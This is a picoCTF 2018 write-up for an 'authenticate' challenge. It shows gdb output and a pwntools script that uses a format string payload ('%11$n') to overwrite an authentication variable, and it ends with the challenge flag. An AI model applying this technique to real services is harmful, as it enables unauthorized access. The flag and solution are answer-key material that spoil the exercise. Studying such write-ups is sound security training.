[Category:Picoctf](/Category:Picoctf "wikilink") Can you authenticate to
this service and get the flag? Connect with nc 2018shell.picoctf.com
26336. Source.

<nowiki>

we first look through the code and try to find the vulnerability. the
code checks for a yes or a no and if its something else just printf that
stuff.

now we can do a format string attack

we run gdb

gdb auth

//get the pointer to the authentication variable. gdb-peda$ x
\&authenticated 0x804a04c <authenticated>: 0x00000000

so we have our target 0x0804a04c

now lets enumerate over the format attack to see how far off we are we
do this with passing %i$x to the printf function with python once we see
our 804a04c we know thats the relative path we need to go

from pwn import \*

1.  sh = process('./auth')

sh = remote('2018shell2.picoctf.com', 52918) target = 0x0804a04c

payload = '' payload += p32(target)

1.  payload += '%11$n'

`for i in range(5, 20):`
`  payload += '%{}$x '.format(i)`

sh.sendlineafter(')\\n', payload)

sh.interactive()

once we know where it is just comment the for loop and use the payload.
this will write a 1 to the value.

picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_e8337b91} <nowiki>